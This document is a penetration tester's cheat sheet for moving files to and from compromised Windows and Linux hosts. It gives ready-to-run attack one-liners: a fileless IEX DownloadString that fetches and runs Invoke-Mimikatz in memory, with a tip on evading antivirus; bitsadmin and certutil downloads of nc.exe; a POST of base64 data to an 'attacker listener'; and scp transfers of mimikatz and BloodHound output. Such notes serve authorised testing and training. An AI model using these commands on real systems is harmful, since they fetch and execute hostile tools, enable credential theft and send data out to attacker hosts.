#tools #file-transfer #powershell #curl

# File Transfers

Related: [shells-payloads](shells-payloads.md) · [credential-theft](../Windows/credential-theft.md) · [pivoting](../Network/pivoting.md)

## Contents
- [Windows (download)](#windows-download)
- [Windows (upload)](#windows-upload)
- [Linux](#linux)
- [SCP (both ways)](#scp-both-ways)
- [rsync / sftp (Linux targets)](#rsync--sftp-linux-targets)
- [Serve Files](#serve-files)

## Quick Reference

| Direction | OS | Method | Notes |
|---|---|---|---|
| Download | Windows | `Invoke-WebRequest` | writes file to disk |
| Download | Windows | `IEX`/`DownloadString` | fileless, in-memory execution |
| Download | Windows | BITS (`bitsadmin`) | background transfer service |
| Download | Windows | `certutil` | abuses a signed native binary |
| Upload | Windows | `Invoke-WebRequest -Method POST` | base64 body to attacker listener |
| Download | Linux | `wget` / `curl` | standard |
| Download | Linux | `php -r ...` | fallback when wget/curl absent |
| Both ways | Any | `scp` | needs SSH access |
| Both ways | Linux | `rsync` | needs rsync on both ends |
| Both ways | Linux | `sftp` | interactive, SSH-based |
| Serve | Any | `python3 -m http.server` / `impacket-smbserver` | attacker-hosted pull |

## Windows (download)
```powershell
Invoke-WebRequest https://<host>/PowerView.ps1 -OutFile PowerView.ps1
```
Download with PowerShell.

> [!TIP]
> The next one-liner downloads *and* executes entirely in memory — nothing touches disk, so there's no dropped file for AV to scan (AMSI/script-block logging can still catch it).
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://<host>/Invoke-Mimikatz.ps1')
```
Download and execute in memory (fileless).

```cmd
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
```
Download with BITS.

```cmd
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```
Download with certutil.

## Windows (upload)
```powershell
Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
```
POST base64 data to an attacker listener.

## Linux
```bash
wget https://<host>/LinEnum.sh -O /tmp/LinEnum.sh
```
Download with wget (`curl -o /tmp/LinEnum.sh <url>` alternative).

```bash
php -r '$file=file_get_contents("https://<host>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
Download with PHP (when php is present but wget/curl aren't).

## SCP (both ways)
```bash
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip
```
Upload (`scp user@target:/tmp/mimikatz.exe C:\Temp\` to download).

## rsync / sftp (Linux targets)
```bash
rsync -avz /path/to/local/file username@<target>:/path/to/remote/destination
```
Transfer a file to a Linux target over rsync (`rsync -avz username@<target>:/path/to/remote/file /path/to/local/destination` to pull it back).

```bash
sftp username@<target>
```
Connect interactively via SFTP; `put <local> <remote>` to upload, `get <remote> <local>` to download.

## Serve Files
```bash
python3 -m http.server 8000
```
Quick HTTP server (`impacket-smbserver share ./ -smb2support` for SMB). See [credentialed-enumeration](../AD/credentialed-enumeration.md).
